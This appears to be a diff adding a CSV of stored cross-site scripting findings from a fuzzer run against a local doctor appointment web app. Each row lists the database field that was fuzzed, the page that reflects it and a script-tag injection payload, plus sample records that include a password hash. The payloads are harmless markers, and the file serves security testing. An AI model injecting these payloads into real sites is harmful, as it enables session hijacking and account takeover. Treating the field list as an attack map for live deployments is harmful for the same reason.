@@ -1,0 +1,277 @@
+web app,DB source,reflection sink,id,payload,description
+doctor,tblappointment.Name,http://localhost/dams/doctor/view-appointment-detail.php?editid=5&&aptid=607441873,907091,"""'><script>xss(907091)</script>","
+            damsmsdb.tblappointment.Name[4][2]
+            original row: [5, 607441873, 'Anuj kumar', 1425362514, 'anujkkk@hmak.com', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
+            fuzzed row: [5, 607441873, '""\'><script>xss(907091)</script>', 1425362514, 'anujkkk@hmak.com', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
+            change: 'Anuj kumar' => '""'><script>xss(907091)</script>'
+            
+fuzzed after scan 0 / 15
+found as XSS in scan 1 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,909857,"""'><script>xss(909857)</script>","
+            damsmsdb.tblspecialization.Specialization[2][1]
+            original row: [3, 'Obstetrics and Gynecology', datetime.datetime(2022, 11, 9, 14, 24, 14)]
+            fuzzed row: [3, '""\'><script>xss(909857)</script>', datetime.datetime(2022, 11, 9, 14, 24, 14)]
+            change: 'Obstetrics and Gynecology' => '""'><script>xss(909857)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tblappointment.Email,http://localhost/dams/doctor/view-appointment-detail.php?editid=5&&aptid=607441873,909964,"""'><script>xss(909964)</script>","
+            damsmsdb.tblappointment.Email[4][4]
+            original row: [5, 607441873, 'Anuj kumar', 1425362514, 'anujkkk@hmak.com', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
+            fuzzed row: [5, 607441873, 'Anuj kumar', 1425362514, '""\'><script>xss(909964)</script>', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
+            change: 'anujkkk@hmak.com' => '""'><script>xss(909964)</script>'
+            
+fuzzed after scan 1 / 15
+found as XSS in scan 2 / 15"
+doctor,tblpage.PageDescription,http://localhost/dams/,919681,"""'><script>xss(919681)</script>","
+            damsmsdb.tblpage.PageDescription[1][3]
+            original row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', 'info@gmail.com', 7896541239, None, '10:30 am to 7:30 pm']
+            fuzzed row: [2, 'contactus', 'Contact Us', '""\'><script>xss(919681)</script>', 'info@gmail.com', 7896541239, None, '10:30 am to 7:30 pm']
+            change: '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)' => '""'><script>xss(919681)</script>'
+            
+fuzzed after scan 12 / 15
+found as XSS in scan 13 / 15"
+doctor,tblappointment.Name,http://localhost/dams/doctor/view-appointment-detail.php?editid=3&&aptid=485109480,921964,"""'><script>xss(921964)</script>","
+            damsmsdb.tblappointment.Name[2][2]
+            original row: [3, 485109480, 'Tina Yadav', 4654564464, 'tina@gmail.com', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
+            fuzzed row: [3, 485109480, '""\'><script>xss(921964)</script>', 4654564464, 'tina@gmail.com', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
+            change: 'Tina Yadav' => '""'><script>xss(921964)</script>'
+            
+fuzzed after scan 0 / 15
+found as XSS in scan 1 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,923583,"""'><script>xss(923583)</script>","
+            damsmsdb.tblspecialization.Specialization[4][1]
+            original row: [5, 'Pediatrics', datetime.datetime(2022, 11, 9, 14, 25, 6)]
+            fuzzed row: [5, '""\'><script>xss(923583)</script>', datetime.datetime(2022, 11, 9, 14, 25, 6)]
+            change: 'Pediatrics' => '""'><script>xss(923583)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tblpage.Email,http://localhost/dams/,926939,"""'><script>xss(926939)</script>","
+            damsmsdb.tblpage.Email[1][4]
+            original row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', 'info@gmail.com', 7896541239, None, '10:30 am to 7:30 pm']
+            fuzzed row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', '""\'><script>xss(926939)</script>', 7896541239, None, '10:30 am to 7:30 pm']
+            change: 'info@gmail.com' => '""'><script>xss(926939)</script>'
+            
+fuzzed after scan 13 / 15
+found as XSS in scan 14 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,927505,"""'><script>xss(927505)</script>","
+            damsmsdb.tblspecialization.Specialization[7][1]
+            original row: [8, 'Ophthalmology', datetime.datetime(2022, 11, 9, 14, 27, 18)]
+            fuzzed row: [8, '""\'><script>xss(927505)</script>', datetime.datetime(2022, 11, 9, 14, 27, 18)]
+            change: 'Ophthalmology' => '""'><script>xss(927505)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tblappointment.Email,http://localhost/dams/doctor/view-appointment-detail.php?editid=3&&aptid=485109480,934259,"""'><script>xss(934259)</script>","
+            damsmsdb.tblappointment.Email[2][4]
+            original row: [3, 485109480, 'Tina Yadav', 4654564464, 'tina@gmail.com', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
+            fuzzed row: [3, 485109480, 'Tina Yadav', 4654564464, '""\'><script>xss(934259)</script>', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
+            change: 'tina@gmail.com' => '""'><script>xss(934259)</script>'
+            
+fuzzed after scan 1 / 15
+found as XSS in scan 2 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,936240,"""'><script>xss(936240)</script>","
+            damsmsdb.tblspecialization.Specialization[3][1]
+            original row: [4, 'Dermatology', datetime.datetime(2022, 11, 9, 14, 24, 42)]
+            fuzzed row: [4, '""\'><script>xss(936240)</script>', datetime.datetime(2022, 11, 9, 14, 24, 42)]
+            change: 'Dermatology' => '""'><script>xss(936240)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tblpage.Timing,http://localhost/dams/,937012,"""'><script>xss(937012)</script>","
+            damsmsdb.tblpage.Timing[1][7]
+            original row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', 'info@gmail.com', 7896541239, None, '10:30 am to 7:30 pm']
+            fuzzed row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', 'info@gmail.com', 7896541239, None, '""\'><script>xss(937012)</script>']
+            change: '10:30 am to 7:30 pm' => '""'><script>xss(937012)</script>'
+            
+fuzzed after scan 14 / 15
+found as XSS in scan 15 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,956759,"""'><script>xss(956759)</script>","
+            damsmsdb.tblspecialization.Specialization[6][1]
+            original row: [7, 'General Surgery', datetime.datetime(2022, 11, 9, 14, 25, 52)]
+            fuzzed row: [7, '""\'><script>xss(956759)</script>', datetime.datetime(2022, 11, 9, 14, 25, 52)]
+            change: 'General Surgery' => '""'><script>xss(956759)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,962125,"""'><script>xss(962125)</script>","
+            damsmsdb.tblspecialization.Specialization[11][1]
+            original row: [12, 'Pathology', datetime.datetime(2022, 11, 9, 14, 29, 51)]
+            fuzzed row: [12, '""\'><script>xss(962125)</script>', datetime.datetime(2022, 11, 9, 14, 29, 51)]
+            change: 'Pathology' => '""'><script>xss(962125)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tbldoctor.FullName,"http://localhost/dams/doctor/all-appointment.php
+http://localhost/dams/doctor/all-appointment.php#
+http://localhost/dams/doctor/all-appointment.php#menubar-customizer
+http://localhost/dams/doctor/all-appointment.php#navbar-customizer
+http://localhost/dams/doctor/appointment-bwdates.php
+http://localhost/dams/doctor/appointment-bwdates.php#
+http://localhost/dams/doctor/appointment-bwdates.php#menubar-customizer
+http://localhost/dams/doctor/appointment-bwdates.php#navbar-customizer
+http://localhost/dams/doctor/approved-appointment.php
+http://localhost/dams/doctor/approved-appointment.php#
+http://localhost/dams/doctor/approved-appointment.php#menubar-customizer
+http://localhost/dams/doctor/approved-appointment.php#navbar-customizer
+http://localhost/dams/doctor/cancelled-appointment.php
+http://localhost/dams/doctor/cancelled-appointment.php#
+http://localhost/dams/doctor/cancelled-appointment.php#menubar-customizer
+http://localhost/dams/doctor/cancelled-appointment.php#navbar-customizer
+http://localhost/dams/doctor/change-password.php
+http://localhost/dams/doctor/change-password.php#
+http://localhost/dams/doctor/change-password.php#menubar-customizer
+http://localhost/dams/doctor/change-password.php#navbar-customizer
+http://localhost/dams/doctor/dashboard.php
+http://localhost/dams/doctor/dashboard.php#
+http://localhost/dams/doctor/dashboard.php#menubar-customizer
+http://localhost/dams/doctor/dashboard.php#navbar-customizer
+http://localhost/dams/doctor/new-appointment.php
+http://localhost/dams/doctor/new-appointment.php#
+http://localhost/dams/doctor/new-appointment.php#menubar-customizer
+http://localhost/dams/doctor/new-appointment.php#navbar-customizer
+http://localhost/dams/doctor/profile.php
+http://localhost/dams/doctor/profile.php#
+http://localhost/dams/doctor/profile.php#menubar-customizer
+http://localhost/dams/doctor/profile.php#navbar-customizer
+http://localhost/dams/doctor/search.php
+http://localhost/dams/doctor/search.php#
+http://localhost/dams/doctor/search.php#menubar-customizer
+http://localhost/dams/doctor/search.php#navbar-customizer
+http://localhost/dams/doctor/view-appointment-detail.php?editid=3&&aptid=485109480
+http://localhost/dams/doctor/view-appointment-detail.php?editid=4&&aptid=611388102
+http://localhost/dams/doctor/view-appointment-detail.php?editid=5&&aptid=607441873",964386,"""'><script>xss(964386)</script>","
+            damsmsdb.tbldoctor.FullName[0][1]
+            original row: [1, 'Dr. Anusakha Singh', 9787979798, 'anu@gmail.com', '1', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 9, 15, 1, 11)]
+            fuzzed row: [1, '""\'><script>xss(964386)</script>', 9787979798, 'anu@gmail.com', '1', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 9, 15, 1, 11)]
+            change: 'Dr. Anusakha Singh' => '""'><script>xss(964386)</script>'
+            
+fuzzed after scan 6 / 15
+found as XSS in scan 7 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,968482,"""'><script>xss(968482)</script>","
+            damsmsdb.tblspecialization.Specialization[1][1]
+            original row: [2, 'Internal Medicine', datetime.datetime(2022, 11, 9, 14, 23, 42)]
+            fuzzed row: [2, '""\'><script>xss(968482)</script>', datetime.datetime(2022, 11, 9, 14, 23, 42)]
+            change: 'Internal Medicine' => '""'><script>xss(968482)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tblappointment.Email,http://localhost/dams/doctor/view-appointment-detail.php?editid=4&&aptid=611388102,968509,"""'><script>xss(968509)</script>","
+            damsmsdb.tblappointment.Email[3][4]
+            original row: [4, 611388102, 'Jyoti', 7897987987, 'jyoti@gmail.com', datetime.date(2022, 11, 12), datetime.timedelta(seconds=7200), '1', 1, 'Thanks', datetime.datetime(2022, 11, 10, 14, 31, 17), None, None, None]
+            fuzzed row: [4, 611388102, 'Jyoti', 7897987987, '""\'><script>xss(968509)</script>', datetime.date(2022, 11, 12), datetime.timedelta(seconds=7200), '1', 1, 'Thanks', datetime.datetime(2022, 11, 10, 14, 31, 17), None, None, None]
+            change: 'jyoti@gmail.com' => '""'><script>xss(968509)</script>'
+            
+fuzzed after scan 1 / 15
+found as XSS in scan 2 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,969545,"""'><script>xss(969545)</script>","
+            damsmsdb.tblspecialization.Specialization[8][1]
+            original row: [9, 'Family Medicine', datetime.datetime(2022, 11, 9, 14, 27, 52)]
+            fuzzed row: [9, '""\'><script>xss(969545)</script>', datetime.datetime(2022, 11, 9, 14, 27, 52)]
+            change: 'Family Medicine' => '""'><script>xss(969545)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,970238,"""'><script>xss(970238)</script>","
+            damsmsdb.tblspecialization.Specialization[9][1]
+            original row: [10, 'Chest Medicine', datetime.datetime(2022, 11, 9, 14, 28, 32)]
+            fuzzed row: [10, '""\'><script>xss(970238)</script>', datetime.datetime(2022, 11, 9, 14, 28, 32)]
+            change: 'Chest Medicine' => '""'><script>xss(970238)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,970767,"""'><script>xss(970767)</script>","
+            damsmsdb.tblspecialization.Specialization[12][1]
+            original row: [13, 'ENT', datetime.datetime(2022, 11, 9, 14, 30, 13)]
+            fuzzed row: [13, '""\'><script>xss(970767)</script>', datetime.datetime(2022, 11, 9, 14, 30, 13)]
+            change: 'ENT' => '""'><script>xss(970767)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,971512,"""'><script>xss(971512)</script>","
+            damsmsdb.tblspecialization.Specialization[5][1]
+            original row: [6, 'Radiology', datetime.datetime(2022, 11, 9, 14, 25, 31)]
+            fuzzed row: [6, '""\'><script>xss(971512)</script>', datetime.datetime(2022, 11, 9, 14, 25, 31)]
+            change: 'Radiology' => '""'><script>xss(971512)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tbldoctor.Email,"http://localhost/dams/doctor/all-appointment.php
+http://localhost/dams/doctor/all-appointment.php#
+http://localhost/dams/doctor/all-appointment.php#menubar-customizer
+http://localhost/dams/doctor/all-appointment.php#navbar-customizer
+http://localhost/dams/doctor/appointment-bwdates.php
+http://localhost/dams/doctor/appointment-bwdates.php#
+http://localhost/dams/doctor/appointment-bwdates.php#menubar-customizer
+http://localhost/dams/doctor/appointment-bwdates.php#navbar-customizer
+http://localhost/dams/doctor/approved-appointment.php
+http://localhost/dams/doctor/approved-appointment.php#
+http://localhost/dams/doctor/approved-appointment.php#menubar-customizer
+http://localhost/dams/doctor/approved-appointment.php#navbar-customizer
+http://localhost/dams/doctor/cancelled-appointment.php
+http://localhost/dams/doctor/cancelled-appointment.php#
+http://localhost/dams/doctor/cancelled-appointment.php#menubar-customizer
+http://localhost/dams/doctor/cancelled-appointment.php#navbar-customizer
+http://localhost/dams/doctor/change-password.php
+http://localhost/dams/doctor/change-password.php#
+http://localhost/dams/doctor/change-password.php#menubar-customizer
+http://localhost/dams/doctor/change-password.php#navbar-customizer
+http://localhost/dams/doctor/dashboard.php
+http://localhost/dams/doctor/dashboard.php#
+http://localhost/dams/doctor/dashboard.php#menubar-customizer
+http://localhost/dams/doctor/dashboard.php#navbar-customizer
+http://localhost/dams/doctor/new-appointment.php
+http://localhost/dams/doctor/new-appointment.php#
+http://localhost/dams/doctor/new-appointment.php#menubar-customizer
+http://localhost/dams/doctor/new-appointment.php#navbar-customizer
+http://localhost/dams/doctor/profile.php
+http://localhost/dams/doctor/profile.php#
+http://localhost/dams/doctor/profile.php#menubar-customizer
+http://localhost/dams/doctor/profile.php#navbar-customizer
+http://localhost/dams/doctor/search.php
+http://localhost/dams/doctor/search.php#
+http://localhost/dams/doctor/search.php#menubar-customizer
+http://localhost/dams/doctor/search.php#navbar-customizer
+http://localhost/dams/doctor/view-appointment-detail.php?editid=3&&aptid=485109480
+http://localhost/dams/doctor/view-appointment-detail.php?editid=4&&aptid=611388102
+http://localhost/dams/doctor/view-appointment-detail.php?editid=5&&aptid=607441873",975463,"""'><script>xss(975463)</script>","
+            damsmsdb.tbldoctor.Email[0][3]
+            original row: [1, 'Dr. Anusakha Singh', 9787979798, 'anu@gmail.com', '1', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 9, 15, 1, 11)]
+            fuzzed row: [1, 'Dr. Anusakha Singh', 9787979798, '""\'><script>xss(975463)</script>', '1', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 9, 15, 1, 11)]
+            change: 'anu@gmail.com' => '""'><script>xss(975463)</script>'
+            
+fuzzed after scan 7 / 15
+found as XSS in scan 8 / 15"
+doctor,tblpage.PageDescription,http://localhost/dams/,980687,"""'><script>xss(980687)</script>","
+            damsmsdb.tblpage.PageDescription[0][3]
+            original row: [1, 'aboutus', 'About Us', '<div><font color=""#202124"" face=""arial, sans-serif""><b>Our mission declares our purpose of existence as a company and our objectives.</b></font></div><div><font color=""#202124"" face=""arial, sans-serif""><b><br></b></font></div><div><font color=""#202124"" face=""arial, sans-serif""><b>To give every customer much more than what he/she asks for in terms of quality, selection, value for money and customer service, by understanding local tastes and preferences and innovating constantly to eventually provide an unmatched experience in jewellery shopping.</b></font></div>', None, None, None, '']
+            fuzzed row: [1, 'aboutus', 'About Us', '""\'><script>xss(980687)</script>', None, None, None, '']
+            change: '<div><font color=""#202124"" face=""arial, sans-serif""><b>Our mission declares our purpose of existence as a company and our objectives.</b></font></div><div><font color=""#202124"" face=""arial, sans-serif""><b><br></b></font></div><div><font color=""#202124"" face=""arial, sans-serif""><b>To give every customer much more than what he/she asks for in terms of quality, selection, value for money and customer service, by understanding local tastes and preferences and innovating constantly to eventually provide an unmatched experience in jewellery shopping.</b></font></div>' => '""'><script>xss(980687)</script>'
+            
+fuzzed after scan 12 / 15
+found as XSS in scan 13 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,988938,"""'><script>xss(988938)</script>","
+            damsmsdb.tblspecialization.Specialization[0][1]
+            original row: [1, 'Orthopedics', datetime.datetime(2022, 11, 9, 14, 22, 33)]
+            fuzzed row: [1, '""\'><script>xss(988938)</script>', datetime.datetime(2022, 11, 9, 14, 22, 33)]
+            change: 'Orthopedics' => '""'><script>xss(988938)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
+doctor,tblappointment.Name,http://localhost/dams/doctor/view-appointment-detail.php?editid=4&&aptid=611388102,993916,"""'><script>xss(993916)</script>","
+            damsmsdb.tblappointment.Name[3][2]
+            original row: [4, 611388102, 'Jyoti', 7897987987, 'jyoti@gmail.com', datetime.date(2022, 11, 12), datetime.timedelta(seconds=7200), '1', 1, 'Thanks', datetime.datetime(2022, 11, 10, 14, 31, 17), None, None, None]
+            fuzzed row: [4, 611388102, '""\'><script>xss(993916)</script>', 7897987987, 'jyoti@gmail.com', datetime.date(2022, 11, 12), datetime.timedelta(seconds=7200), '1', 1, 'Thanks', datetime.datetime(2022, 11, 10, 14, 31, 17), None, None, None]
+            change: 'Jyoti' => '""'><script>xss(993916)</script>'
+            
+fuzzed after scan 0 / 15
+found as XSS in scan 1 / 15"
+doctor,tblspecialization.Specialization,http://localhost/dams/,999536,"""'><script>xss(999536)</script>","
+            damsmsdb.tblspecialization.Specialization[10][1]
+            original row: [11, 'Anesthesia', datetime.datetime(2022, 11, 9, 14, 29, 12)]
+            fuzzed row: [11, '""\'><script>xss(999536)</script>', datetime.datetime(2022, 11, 9, 14, 29, 12)]
+            change: 'Anesthesia' => '""'><script>xss(999536)</script>'
+            
+fuzzed after scan 15 / 15
+found as XSS in scan 16 / 15"
